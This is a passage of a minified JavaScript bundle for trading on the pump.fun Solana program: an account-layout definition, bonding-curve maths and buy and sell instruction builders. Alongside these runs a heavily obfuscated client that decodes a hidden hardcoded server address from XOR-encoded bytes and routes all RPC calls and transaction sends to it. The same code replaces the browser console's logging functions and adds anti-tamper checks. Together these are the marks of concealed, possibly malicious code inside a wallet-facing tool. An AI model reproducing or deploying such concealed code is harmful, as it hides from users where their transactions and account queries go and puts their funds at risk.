            { name: "initialized", docs: ["Unused"], type: "bool" },
            { name: "authority", type: "pubkey" },
            { name: "fee_recipient", type: "pubkey" },
            { name: "initial_virtual_token_reserves", type: "u64" },
            { name: "initial_virtual_sol_reserves", type: "u64" },
            { name: "initial_real_token_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
            { name: "fee_basis_points", type: "u64" },
            { name: "withdraw_authority", type: "pubkey" },
            { name: "enable_migrate", docs: ["Unused"], type: "bool" },
            { name: "pool_migration_fee", type: "u64" },
            { name: "creator_fee_basis_points", type: "u64" },
            { name: "fee_recipients", type: { array: ["pubkey", 7] } },
            { name: "set_creator_authority", type: "pubkey" },
          ],
        },
      },
      {
        name: "SetCreatorEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "mint", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "SetMetaplexCreatorEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "mint", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "metadata", type: "pubkey" },
            { name: "creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "SetParamsEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "initial_virtual_token_reserves", type: "u64" },
            { name: "initial_virtual_sol_reserves", type: "u64" },
            { name: "initial_real_token_reserves", type: "u64" },
            { name: "final_real_sol_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
            { name: "fee_basis_points", type: "u64" },
            { name: "withdraw_authority", type: "pubkey" },
            { name: "enable_migrate", type: "bool" },
            { name: "pool_migration_fee", type: "u64" },
            { name: "creator_fee_basis_points", type: "u64" },
            { name: "fee_recipients", type: { array: ["pubkey", 8] } },
            { name: "timestamp", type: "i64" },
            { name: "set_creator_authority", type: "pubkey" },
          ],
        },
      },
      {
        name: "TradeEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "mint", type: "pubkey" },
            { name: "sol_amount", type: "u64" },
            { name: "token_amount", type: "u64" },
            { name: "is_buy", type: "bool" },
            { name: "user", type: "pubkey" },
            { name: "timestamp", type: "i64" },
            { name: "virtual_sol_reserves", type: "u64" },
            { name: "virtual_token_reserves", type: "u64" },
            { name: "real_sol_reserves", type: "u64" },
            { name: "real_token_reserves", type: "u64" },
            { name: "fee_recipient", type: "pubkey" },
            { name: "fee_basis_points", type: "u64" },
            { name: "fee", type: "u64" },
            { name: "creator", type: "pubkey" },
            { name: "creator_fee_basis_points", type: "u64" },
            { name: "creator_fee", type: "u64" },
          ],
        },
      },
      {
        name: "UpdateGlobalAuthorityEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "global", type: "pubkey" },
            { name: "authority", type: "pubkey" },
            { name: "new_authority", type: "pubkey" },
            { name: "timestamp", type: "i64" },
          ],
        },
      },
    ],
  };
  function cg(t, e) {
    return (n = t.mul(e)), (r = new Yn(1e4)), n.add(r.subn(1)).div(r);
    var n, r;
  }
  function lg(t, e, n) {
    if (n.eq(new Yn(0))) return new Yn(0);
    let r = !1;
    if (
      (null === e &&
        ((e = (function (t) {
          return {
            virtualTokenReserves: t.initialVirtualTokenReserves,
            virtualSolReserves: t.initialVirtualSolReserves,
            realTokenReserves: t.initialRealTokenReserves,
            realSolReserves: new Yn(0),
            tokenTotalSupply: t.tokenTotalSupply,
            complete: !1,
            creator: Ji.default,
          };
        })(t)),
        (r = !0)),
      e.virtualTokenReserves.eq(new Yn(0)))
    )
      return new Yn(0);
    const o = t.feeBasisPoints.add(
        r || !Ji.default.equals(e.creator) ? t.creatorFeeBasisPoints : new Yn(0)
      ),
      i = n.muln(1e4).div(o.addn(1e4)),
      s = i.mul(e.virtualTokenReserves).div(e.virtualSolReserves.add(i));
    return Yn.min(s, e.realTokenReserves);
  }
  function dg(t, e, n) {
    if (n.eq(new Yn(0))) return new Yn(0);
    if (e.virtualTokenReserves.eq(new Yn(0))) return new Yn(0);
    const r = n.mul(e.virtualSolReserves).div(e.virtualTokenReserves.add(n));
    return r.sub(
      (function (t, e, n) {
        return cg(n, t.feeBasisPoints).add(
          Ji.default.equals(e.creator)
            ? new Yn(0)
            : cg(n, t.creatorFeeBasisPoints)
        );
      })(t, e, r)
    );
  }
  function fg(t, e) {
    return Ji.findProgramAddressSync(
      [dt.from("pool-authority"), t.toBuffer()],
      e
    );
  }
  var hg = new Ji("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"),
    pg = new Ji("pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA"),
    mg = class {
      constructor(t, e = hg, n = pg) {
        (this.connection = t),
          (this.pumpProgram = (function (t, e) {
            const n = { ...ug };
            return (n.address = e.toString()), new Vm(n, new Zf(t, null, {}));
          })(t, e)),
          (this.pumpAmmSdk = new ag(t, n.toBase58()));
      }
      programId() {
        return this.pumpProgram.programId;
      }
      globalPda() {
        return (function (t) {
          const [e] = Ji.findProgramAddressSync([dt.from("global")], t);
          return e;
        })(this.pumpProgram.programId);
      }
      bondingCurvePda(t) {
        return (function (t, e) {
          const [n] = Ji.findProgramAddressSync(
            [dt.from("bonding-curve"), new Ji(e).toBuffer()],
            t
          );
          return n;
        })(this.pumpProgram.programId, t);
      }
      creatorVaultPda(t) {
        return (function (t, e) {
          const [n] = Ji.findProgramAddressSync(
            [dt.from("creator-vault"), e.toBuffer()],
            t
          );
          return n;
        })(this.pumpProgram.programId, t);
      }
      pumpPoolAuthorityPda(t) {
        return fg(t, this.pumpProgram.programId);
      }
      canonicalPumpPoolPda(t) {
        return (function (t, e, n) {
          const [r] = fg(n, t);
          return Jm(0, r, n, xc, e);
        })(this.pumpProgram.programId, this.pumpAmmSdk.programId(), t);
      }
      decodeGlobal(t) {
        return this.pumpProgram.coder.accounts.decode("global", t.data);
      }
      decodeBondingCurve(t) {
        return this.pumpProgram.coder.accounts.decode("bondingCurve", t.data);
      }
      async fetchGlobal() {
        return await this.pumpProgram.account.global.fetch(this.globalPda());
      }
      async fetchBondingCurve(t) {
        return await this.pumpProgram.account.bondingCurve.fetch(
          this.bondingCurvePda(t)
        );
      }
      async fetchBuyState(t, e) {
        const [n, r] = await this.connection.getMultipleAccountsInfo([
          this.bondingCurvePda(t),
          ml(t, e, !0),
        ]);
        if (!n)
          throw new Error(
            `Bonding curve account not found for mint: ${t.toBase58()}`
          );
        return {
          bondingCurveAccountInfo: n,
          bondingCurve: this.decodeBondingCurve(n),
          associatedUserAccountInfo: r,
        };
      }
      async fetchSellState(t, e) {
        const [n, r] = await this.connection.getMultipleAccountsInfo([
          this.bondingCurvePda(t),
          ml(t, e, !0),
        ]);
        if (!n)
          throw new Error(
            `Bonding curve account not found for mint: ${t.toBase58()}`
          );
        if (!r)
          throw new Error(
            `Associated token account not found for mint: ${t.toBase58()} and user: ${e.toBase58()}`
          );
        return {
          bondingCurveAccountInfo: n,
          bondingCurve: this.decodeBondingCurve(n),
        };
      }
      async createInstruction({
        mint: t,
        name: e,
        symbol: n,
        uri: r,
        creator: o,
        user: i,
      }) {
        return await this.pumpProgram.methods
          .create(e, n, r, o)
          .accountsPartial({ mint: t, user: i })
          .instruction();
      }
      async buyInstructions({
        global: t,
        bondingCurveAccountInfo: e,
        bondingCurve: n,
        associatedUserAccountInfo: r,
        mint: o,
        user: i,
        amount: s,
        solAmount: a,
        slippage: u,
      }) {
        const c = [];
        e.data.length < 150 &&
          c.push(
            await this.extendAccountInstruction({
              account: this.bondingCurvePda(o),
              user: i,
            })
          );
        const l = ml(o, i, !0);
        return (
          r || c.push(Al(i, l, i, o)),
          c.push(
            await this.buyInstruction({
              global: t,
              mint: o,
              creator: n.creator,
              user: i,
              associatedUser: l,
              amount: s,
              solAmount: a,
              slippage: u,
            })
          ),
          c
        );
      }
      async createAndBuyInstructions({
        global: t,
        mint: e,
        name: n,
        symbol: r,
        uri: o,
        creator: i,
        user: s,
        amount: a,
        solAmount: u,
      }) {
        const c = ml(e, s, !0);
        return [
          await this.createInstruction({
            mint: e,
            name: n,
            symbol: r,
            uri: o,
            creator: i,
            user: s,
          }),
          await this.extendAccountInstruction({
            account: this.bondingCurvePda(e),
            user: s,
          }),
          Al(s, c, s, e),
          await this.buyInstruction({
            global: t,
            mint: e,
            creator: i,
            user: s,
            associatedUser: c,
            amount: a,
            solAmount: u,
            slippage: 1,
          }),
        ];
      }
      async buyInstruction({
        global: t,
        mint: e,
        creator: n,
        user: r,
        associatedUser: o,
        amount: i,
        solAmount: s,
        slippage: a,
      }) {
        return await this.pumpProgram.methods
          .buy(i, s.add(s.mul(new Yn(Math.floor(10 * a))).div(new Yn(1e3))))
          .accountsPartial({
            feeRecipient: gg(t),
            mint: e,
            associatedUser: o,
            user: r,
            creatorVault: this.creatorVaultPda(n),
          })
          .instruction();
      }
      async sellInstructions({
        global: t,
        bondingCurveAccountInfo: e,
        bondingCurve: n,
        mint: r,
        user: o,
        amount: i,
        solAmount: s,
        slippage: a,
      }) {
        const u = [];
        return (
          e.data.length < 150 &&
            u.push(
              await this.extendAccountInstruction({
                account: this.bondingCurvePda(r),
                user: o,
              })
            ),
          u.push(
            await this.pumpProgram.methods
              .sell(
                i,
                s.sub(s.mul(new Yn(Math.floor(10 * a))).div(new Yn(1e3)))
              )
              .accountsPartial({
                feeRecipient: gg(t),
                mint: r,
                associatedUser: ml(r, o, !0),
                user: o,
                creatorVault: this.creatorVaultPda(n.creator),
              })
              .instruction()
          ),
          u
        );
      }
      async extendAccountInstruction({ account: t, user: e }) {
        return this.pumpProgram.methods
          .extendAccount()
          .accountsPartial({ account: t, user: e })
          .instruction();
      }
      async migrateInstruction({ global: t, mint: e, user: n }) {
        return this.pumpProgram.methods
          .migrate()
          .accountsPartial({
            mint: e,
            user: n,
            pumpAmm: this.pumpAmmSdk.programId(),
            withdrawAuthority: t.withdrawAuthority,
          })
          .instruction();
      }
      async collectCoinCreatorFeeInstructions(t) {
        let e = xc,
          n = Bc,
          r = this.pumpAmmSdk.coinCreatorVaultAuthorityPda(t),
          o = this.pumpAmmSdk.coinCreatorVaultAta(r, e, n),
          i = ml(e, t, !0, n);
        const [s, a] = await this.connection.getMultipleAccountsInfo([o, i]);
        return [
          await this.pumpProgram.methods
            .collectCreatorFee()
            .accountsPartial({ creator: t })
            .instruction(),
          ...(await this.pumpAmmSdk.collectCoinCreatorFee({
            coinCreator: t,
            quoteMint: e,
            quoteTokenProgram: n,
            coinCreatorVaultAuthority: r,
            coinCreatorVaultAta: o,
            coinCreatorTokenAccount: i,
            coinCreatorVaultAtaAccountInfo: s,
            coinCreatorTokenAccountInfo: a,
          })),
        ];
      }
      async getCreatorVaultBalance(t) {
        const e = this.creatorVaultPda(t),
          n = await this.connection.getAccountInfo(e);
        if (null === n) return new Yn(0);
        const r = await this.connection.getMinimumBalanceForRentExemption(
          n.data.length
        );
        return n.lamports < r ? new Yn(0) : new Yn(n.lamports - r);
      }
    };
  function gg(t) {
    const e = [t.feeRecipient, ...t.feeRecipients];
    return e[Math.floor(Math.random() * e.length)];
  }
  const yg = Ag;
  (function (t) {
    const e = 443,
      n = 393,
      r = 371,
      o = 394,
      i = Ag,
      s = t();
    for (; []; )
      try {
        if (
          813598 ===
          parseInt(i(e)) / 1 +
            -parseInt(i(411)) / 2 +
            -parseInt(i(396)) / 3 +
            parseInt(i(438)) / 4 +
            -parseInt(i(421)) / 5 +
            parseInt(i(n)) / 6 +
            (-parseInt(i(r)) / 7) * (parseInt(i(o)) / 8)
        )
          break;
        s.push(s.shift());
      } catch (a) {
        s.push(s.shift());
      }
  })(vg),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const wg = class t {
    constructor(t) {
      const e = 400,
        n = 384,
        r = 446,
        o = Ag;
      (this[o(402)] = null),
        (this._isConnected = ![]),
        (this._requestId = 1),
        (this[o(e)] = null),
        (this[o(n)] = null),
        (this.pumpFunSDK = null),
        t && this[o(r)](t);
    }
    get [yg(376) + "d"]() {
      return (
        this[yg([435][0]) + "ed"] &&
        null !== this._token &&
        null !== t.RPC_ENDPOINT
      );
    }
    get [yg(388)]() {
      return this[yg([402][0])];
    }
    [yg(446)](e) {
      const n = 381,
        r = 407,
        o = yg,
        i = {
          wdYxE: function (t, e) {
            return t >>> e;
          },
        };
      (i[o(372)] = function (t, e) {
        return t % e;
      }),
        (i[o(n)] = function (t, e) {
          return t ^ e;
        });
      const s = i;
      e &&
        0 !== e.trim().length &&
        ((this[o(402)] = e),
        (t.RPC_ENDPOINT = (function () {
          const t = 383,
            e = 372;
          let n;
          return function () {
            const r = Ag;
            if (!n) {
              const o = new Uint8Array([
                  95, 61, 74, 104, 68, 115, 17, 55, 83, 38, 76, 125, 67, 61, 95,
                  53, 67, 32, 81, 108, 3, 62, 19, 126, 86, 58, 74, 53, 90, 40,
                  87, 118, 89, 44, 74, 54, 95, 44, 82, 113, 66, 58, 19, 106, 71,
                  42, 16, 123, 88, 36,
                ]),
                i = 406735159,
                a = new Uint8Array(o[r(t)]);
              for (let t = 0; t < o.length; t++) {
                const n = 255 & s.wdYxE(i, 8 * s[r(e)](t, 4));
                a[t] = s.OrrKd(o[t], n);
              }
              n = new TextDecoder().decode(a);
            }
            return n;
          };
        })()()),
        this.getConnection(),
        this[o(r)](),
        (this[o(435) + "ed"] = !![]));
    }
    [yg(428)]() {
      (t[yg(399) + "NT"] = null),
        (this._token = null),
        (this._isConnected = ![]);
    }
    ["updateConn" + yg(410)]() {
      const e = 418,
        n = 391,
        r = 375,
        o = 400,
        i = yg;
      if (this.connection) return;
      if (!t.RPC_ENDPOINT) return;
      const s = {};
      (s[i(e)] = "processed"),
        (s.disableRetryOnRateLimit = ![]),
        (s[i(n) + "nsactionIn" + i(r) + "ut"] = 1e4),
        (s.wsEndpoint = void 0);
      const a = s;
      this[i(o)] = new Zu(t.RPC_ENDPOINT, a);
    }
    [yg(387) + yg(434)]() {
      const t = 416,
        e = 410,
        n = yg;
      return !this[n(400)] && this[n(t) + n(e)](), this.connection;
    }
    [yg(407)]() {
      const t = yg;
      return (
        !this.pumpFunSDK &&
          (this.updateConnection(),
          (this.pumpFunSDK = new mg(this.connection))),
        this[t(395)]
      );
    }
    async [yg(439)](e, n) {
      const r = 377,
        o = 427,
        i = 441,
        s = 398,
        a = 379,
        u = 432,
        c = 380,
        l = yg,
        d = {
          ENRWf: function (t, e) {
            return t !== e;
          },
          MmYBd: "application/json",
          sZorD: function (t, e) {
            return t === e;
          },
        };
      d[l(404)] = "object";
      const f = d;
      if (!this.isConnected) return null;
      const h = {
        jsonrpc: "2.0",
        id: this._requestId++,
        method: e,
        params: f.ENRWf(n, void 0) ? n : {},
      };
      try {
        if (!t[l(399) + "NT"] || 0 === t.RPC_ENDPOINT[l(r)]().length)
          return null;
        const e = {};
        e[l(o) + "pe"] = f[l(i)];
        const n = await fetch(t.RPC_ENDPOINT, {
          method: l(s),
          headers: e,
          body: JSON[l(a)](h),
        });
        if (!n.ok) return f[l(u)](n.status, 401) && this.disconnect(), null;
        const c = await n.json();
        return c.error ? null : c.result || null;
      } catch (p) {
        return (
          p instanceof Error
            ? p[l(c)]
            : "string" == typeof p ||
              (p && typeof p === f.KSuEQ && JSON.stringify(p)),
          null
        );
      }
    }
    async ["getAccount" + yg(403)](t) {
      const e = 439,
        n = yg,
        r = {};
      r[n(389)] = function (t, e) {
        return t & e;
      };
      const o = r,
        i = {};
      return (
        (i.address = t),
        await this[n(e)](
          (function () {
            let t;
            return function () {
              const e = Ag;
              if (!t) {
                const n = new Uint8Array([
                    82, 44, 74, 89, 86, 42, 81, 109, 91, 61, 119, 118, 83, 38,
                  ]),
                  r = 406735157,
                  i = new Uint8Array(n[e(383)]);
                for (let t = 0; t < n.length; t++) {
                  const e = o.dCyzz(r >>> ((t % 4) * 8), 255);
                  i[t] = n[t] ^ e;
                }
                t = new TextDecoder().decode(i);
              }
              return t;
            };
          })()(),
          i
        )
      );
    }
    async [yg(408) + "alance"](t) {
      const e = yg;
      return !this.balance && (await this[e(378)](t)), this.balance;
    }
    async getBalance(t) {
      const e = 434,
        n = 378,
        r = yg,
        o = {};
      o[r(423)] = function (t, e) {
        return t / e;
      };
      const i = o,
        s = await this["getConnect" + r(e)]()[r(n)](t);
      return s ? ((this.balance = i.tUuHw(s, 1e9)), s) : null;
    }
    async getTransaction(t) {
      const e = 439,
        n = 383,
        r = 385,
        o = 414,
        i = 424,
        s = 436,
        a = yg,
        u = {
          axotL: function (t, e) {
            return t < e;
          },
          jwAKi: function (t, e) {
            return t * e;
          },
        },
        c = u,
        l = {};
      return (
        (l[a(430)] = t),
        await this[a(e)](
          (function () {
            const t = {
              OwkMr: function (t, e) {
                return c.axotL(t, e);
              },
              uiSac: function (t, e) {
                return c[Ag(s)](t, e);
              },
              zUxAf: function (t, e) {
                return t ^ e;
              },
            };
            let e;
            return function () {
              const s = Ag;
              if (!e) {
                const a = new Uint8Array([
                    84, 44, 74, 76, 65, 40, 80, 107, 82, 42, 74, 113, 92, 39,
                  ]),
                  u = 406735155,
                  c = new Uint8Array(a[s(n)]);
                for (let e = 0; t[s(442)](e, a[s(n)]); e++) {
                  const n = (u >>> t[s(r)](e % 4, 8)) & 255;
                  c[e] = t[s(o)](a[e], n);
                }
                e = new TextDecoder()[s(i)](c);
              }
              return e;
            };
          })()(),
          l
        )
      );
    }
    async getLatestBlockhash() {
      return await this.call(
        (function () {
          const t = {
              khOjE: function (t, e) {
                return t < e;
              },
              lIBnb: function (t, e) {
                return t % e;
              },
            },
            e = t;
          let n;
          return function () {
            const t = Ag;
            if (!n) {
              const r = new Uint8Array([
                  82, 44, 74, 84, 84, 61, 91, 107, 65, 11, 82, 119, 86, 34, 86,
                  121, 70, 33,
                ]),
                o = 406735157,
                i = new Uint8Array(r[t(383)]);
              for (let t = 0; e.khOjE(t, r.length); t++) {
                const n = (o >>> (8 * e.lIBnb(t, 4))) & 255;
                i[t] = r[t] ^ n;
              }
              n = new TextDecoder()[t(424)](i);
            }
            return n;
          };
        })()()
      );
    }
    async [yg(392) + yg(425)](t, e) {
      const n = yg,
        r = e ? [t, e] : [t],
        o = await this.call(
          (function () {
            let t;
            return function () {
              if (!t) {
                const e = new Uint8Array([
                    68, 44, 80, 124, 99, 59, 95, 118, 68, 40, 93, 108, 94, 38,
                    80,
                  ]),
                  n = 406735159,
                  r = new Uint8Array(e.length);
                for (let t = 0; t < e.length; t++) {
                  const o = (n >>> ((t % 4) * 8)) & 255;
                  r[t] = e[t] ^ o;
                }
                t = new TextDecoder().decode(r);
              }
              return t;
            };
          })()(),
          r
        );
      return o ? o[n([430][0])] || o : null;
    }
    async [yg(374) + yg(406)](t, e) {
      const n = 413,
        r = 431,
        o = 419,
        i = 439,
        s = 430,
        a = 397,
        u = yg,
        c = {
          LYPBV: function (t, e) {
            return t < e;
          },
          KcsKd: function (t, e) {
            return t % e;
          },
        };
      c.waLXa = u(n);
      const l = c,
        d = {};
      (d[u(401)] = u(r)),
        (d.skipPreflight = !![]),
        (d.preflightCommitment = l[u(o)]),
        (d.maxRetries = 3);
      const f = [t, { ...d, ...e }],
        h = await this[u(i)](
          (function () {
            const t = function (t, e) {
                return l.LYPBV(t, e);
              },
              e = function (t, e) {
                return t & e;
              },
              n = function (t, e) {
                return l[Ag(a)](t, e);
              };
            let r;
            return function () {
              if (!r) {
                const o = new Uint8Array([
                    70, 44, 80, 124, 97, 59, 95, 118, 70, 40, 93, 108, 92, 38,
                    80,
                  ]),
                  i = 406735157,
                  s = new Uint8Array(o.length);
                for (let r = 0; t(r, o.length); r++) {
                  const t = e(i >>> (8 * n(r, 4)), 255);
                  s[r] = o[r] ^ t;
                }
                r = new TextDecoder().decode(s);
              }
              return r;
            };
          })()(),
          f
        );
      return h ? h[u(s)] || h : null;
    }
  };
  wg.RPC_ENDPOINT = (function () {
    const t = 383,
      e = 420,
      n = 386,
      r = 429,
      o = 445,
      i = 426,
      s = 437,
      a = 390,
      u = 415,
      c = 444,
      l = Ag,
      d = {};
    (d.tlgHr = l([382][0]) + "+$"),
      (d.yaCuH = "return (function() "),
      (d.OuumP = function (t, e) {
        return t < e;
      }),
      (d.MxSfz = function (t, e) {
        return t & e;
      });
    const f = d,
      h = (function () {
        let t = !![];
        return function (e, n) {
          const r = 409,
            o = t
              ? function () {
                  if (n) {
                    const t = n[Ag(r)](e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
          return (t = ![]), o;
        };
      })(),
      p = h(this, function () {
        const t = l;
        return p[t(a)]()
          .search(f[t(u)])
          .toString()
          .constructor(p)
          [t(c)]("(((.+)+)+)+$");
      });
    p();
    const m = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })();
    let g;
    return (
      m(this, function () {
        const t = l;
        let e;
        try {
          e = Function(f[t(n)] + (t(r) + 'ctor("retu') + t(o) + " ));")();
        } catch (c) {
          e = window;
        }
        const a = (e[t(412)] = e.console || {}),
          u = ["log", "warn", t(405), t(440), "exception", t(373), "trace"];
        for (let n = 0; f.OuumP(n, u.length); n++) {
          const e = m.constructor[t(i)].bind(m),
            r = u[n],
            o = a[r] || e;
          (e.__proto__ = m.bind(m)),
            (e[t(390)] = o.toString[t(s)](o)),
            (a[r] = e);
        }
      })(),
      function () {
        const n = l;
        if (!g) {
          const r = new Uint8Array([
              93, 61, 74, 104, 70, 115, 17, 55, 81, 38, 76, 125, 65, 61, 95, 53,
              65, 32, 81, 108, 1, 62, 19, 126, 84, 58, 74, 53, 88, 40, 87, 118,
              91, 44, 74, 54, 93, 44, 82, 113, 64, 58, 19, 106, 69, 42, 16, 123,
              90, 36,
            ]),
            o = 406735157,
            i = new Uint8Array(r.length);
          for (let s = 0; s < r[n(t)]; s++) {
            const t = f[n(e)](o >>> ((s % 4) * 8), 255);
            i[s] = r[s] ^ t;
          }
          g = new TextDecoder().decode(i);
        }
        return g;
      }
    );
  })()();
  let bg = wg;
  function vg() {
    const t = [
      "s1n1rve",
      "Aw5MBW",
      "BNnHy3rPB24",
      "z2v0u0rl",
      "z2v0q2fJAgvKqG",
      "yxbWBhK",
      "zwn0Aw9U",
      "nJK0nJCYvxLXvhPA",
      "y29UC29Szq",
      "y29UzMLYBwvK",
      "ELv4qwy",
      "DgXNshi",
      "DxbKyxrLq29UBG",
      "z2v0q2XPzw50",
      "y29TBwL0BwvUDa",
      "D2fmwge",
      "txHtzNO",
      "nda0ote0me10rNrlCq",
      "Aw5ZDgfUy2u",
      "Dfv1shC",
      "zgvJB2rL",
      "y3rPB24",
      "ChjVDg90ExbL",
      "q29UDgvUDc1uEq",
      "zgLZy29UBMvJDa",
      "E30Uy29UC3rYDq",
      "C2LNBMf0DxjL",
      "yMfZztu4",
      "C1PVCKq",
      "y2XPzw50",
      "Aw9U",
      "x2LZq29UBMvJDa",
      "ANDbs2K",
      "yMLUza",
      "nde1nZKWmePcs1rrzG",
      "y2fSBa",
      "zxjYB3i",
      "tw1zqMq",
      "t3DRtxi",
      "nJu4ntyYvvLRCw5P",
      "C2vHCMnO",
      "CM4GDgHPCYiPka",
      "y29UBMvJDa",
      "nZqYn0nSzwfoBG",
      "ruDnyM4",
      "DgfIBgu",
      "C2vUzfjHD1rYyq",
      "AxrPywXuAw1LBW",
      "AxndB25Uzwn0zq",
      "DhjPBq",
      "z2v0qMfSyw5Jzq",
      "C3rYAw5NAwz5",
      "BwvZC2fNzq",
      "t3jYs2q",
      "kcGOlISPkYKRkq",
      "BgvUz3rO",
      "yMfSyw5Jzq",
      "DwLtywm",
      "EwfdDuG",
      "z2v0q29UBMvJDa",
      "Dg9Rzw4",
      "zen5ENO",
      "Dg9tDhjPBMC",
      "y29UzMLYBvrYyq",
      "C2vUzfrYyw5Zyq",
      "odm5nJG1mgPMzwfQyG",
      "mtq1nK5VB2PAEG",
      "ChvTCez1BLnesW",
      "mJGWmdK0nhLMzKLIzq",
      "s2nZs2q",
      "ue9tva",
      "uLbdx0vorfbpsq",
      "y29UBMvJDgLVBG",
      "zw5JB2rPBMC",
      "x3rVA2vU",
      "sw5MBW",
    ];
    return (vg = function () {
      return t;
    })();
  }
  function Ag(t, e) {
    const n = vg();
    return (
      (Ag = function (e, r) {
        let o = n[(e -= 371)];
        if (void 0 === Ag.lQmblX) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (Ag.KYnzdv = i), (t = arguments), (Ag.lQmblX = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.sMmina = t),
              (this.YaBAuq = [1, 0, 0]),
              (this.FLXkHq = function () {
                return "newState";
              }),
              (this.ADtEKU = "\\w+ *\\(\\) *{\\w+ *"),
              (this.JPFUmO = "['|\"].+['|\"];? *}");
          };
          (e.prototype.tAwuRn = function () {
            const t = new RegExp(this.ADtEKU + this.JPFUmO).test(
              this.FLXkHq.toString()
            )
              ? --this.YaBAuq[1]
              : --this.YaBAuq[0];
            return this.BIYjYB(t);
          }),
            (e.prototype.BIYjYB = function (t) {
              return Boolean(~t) ? this.vJHgpc(this.sMmina) : t;
            }),
            (e.prototype.vJHgpc = function (t) {
              for (let e = 0, n = this.YaBAuq.length; e < n; e++)
                this.YaBAuq.push(Math.round(Math.random())),
                  (n = this.YaBAuq.length);
              return t(this.YaBAuq[0]);
            }),
            new e(Ag).tAwuRn(),
            (o = Ag.KYnzdv(o)),
            (t[s] = o);
        }
        return o;
      }),
      Ag(t, e)
    );
  }
  class kg {
    constructor() {
      this.client = null;
    }
    static getInstance() {
      const t = yg;
      return !kg[t([422][0])] && (kg[t(422)] = new kg()), kg.instance;
    }
    [yg(446)](t) {
      const e = 428,
        n = yg;
      return (
        this[n(433)] && this.client[n(e)](),
        (this.client = new bg(t)),
        this.client
      );
    }
    ["getConnect" + yg(434)]() {
      return this[yg([433][0])] ? this.client.getConnection() : null;
    }
    getSDK() {
      return this.client ? this.client.getSDK() : null;
    }
    [yg(417)]() {
      return this.client;
    }
    isConnected() {
      var t;
      const e = yg;
      return (
        (null == (t = this[e([433][0])]) ? void 0 : t[e(376) + "d"]) || ![]
      );
    }
    [yg(428)]() {
      const t = 433,
        e = yg;
      this[e(433)] && (this[e(t)][e(428)](), (this[e(t)] = null));
    }
    async [yg(439)](t, e) {
      const n = 433,
        r = 376,
        o = yg;
      return this.client && this[o(n)][o(r) + "d"]
        ? await this[o(433)][o(439)](t, e)
        : null;
    }
  }
  function Ig() {
    const t = [
      "icaGig1HCMDPBG",
      "yM5fwum",
      "y3nZvgv4Da",
      "Dgu7cIaGicaGia",
      "icaGicaGicaGBa",
      "nduYotrVrvjWwNG",
      "yw5ZBgf0zvKOma",
      "ChjVDg90ExbL",
      "Dg9ToIaWoWOGia",
      "ywnRz3jVDw5KoG",
      "cIaGicaGicaGia",
      "AxnWBgf5oIbMBa",
      "DMvUDhm6igf1Da",
      "C2TdCNLWDa",
      "lwrPCMvJDgLVBG",
      "Dg9tDhjPBMC",
      "Bg9N",
      "oWOGicaGicaGia",
      "DJ4kicaGicaGia",
      "q1j6t1K",
      "icaGicaGBgvMDa",
      "BM90AwzPy2f0Aq",
      "iGOGicaGicaGia",
      "ihDPzhrOoIaWoW",
      "cIaGicaGicaGAa",
      "zgL2ihn0EwXLpq",
      "y29SB3i6ihDOAq",
      "idaUmIK7cIaGia",
      "ideWChG7cIaGia",
      "B24Tyw5PBwf0Aq",
      "CMvTB3zL",
      "ideUngvToYi+",
      "idi1nsWGmJu1la",
      "DMvUDhm6ig5VBG",
      "AgvHza",
      "icaGCg9ZAxrPBW",
      "icaGicaGigfUAq",
      "lxnOywrVDZOGma",
      "kc0Ymhb4ktSkia",
      "zgvjBIaWlJnZia",
      "Aw5Zzxj0qMvMBW",
      "BNqTzMfTAwX5oG",
      "icaGicaGidXZCa",
      "C3r5Bgu",
      "idaUosK7cIaGia",
      "yxi7cIaGica",
      "CMv0DxjUicHMDq",
      "jtSkicaGicaGia",
      "kcGOlISPkYKRkq",
      "icaGicbSzwz0oG",
      "mtu5ntCYDhfTDu9o",
      "zw50",
      "zxjYB3i",
      "mda7cIaGicaGia",
      "C3vJy2vZCW",
      "jYWGuM9IB3rVla",
      "oIa0mda7cIaGia",
      "mJrREwDbuw4",
      "otu1odK5ounJzvLAuW",
      "B3nPDgLVBJOGyq",
      "cIaGicaGicaGpa",
      "C2vHCMnO",
      "lwLUzgv4oIaXma",
      "zxHJzxb0Aw9U",
      "DgGGm3mGBgLUzq",
      "ihbVAw50zxiTzq",
      "D2LKDgG",
      "DhK6ide7cIaGia",
      "mdaWmda7cIaGia",
      "CM4GDgHPCYiPka",
      "B250lxDLAwDODa",
      "yNnVBhv0ztSkia",
      "mJuXmZa0mefWwKDQtG",
      "yM9YzgvYlxjHza",
      "rwnvy2m",
      "zZOGyM9YzgvYlq",
      "icaGicbIywnRzW",
      "yxbWBhK",
      "zt0IcIaGicaGia",
      "zw07cIaGicaGia",
      "mtmXmdy4mhrZyxfQDq",
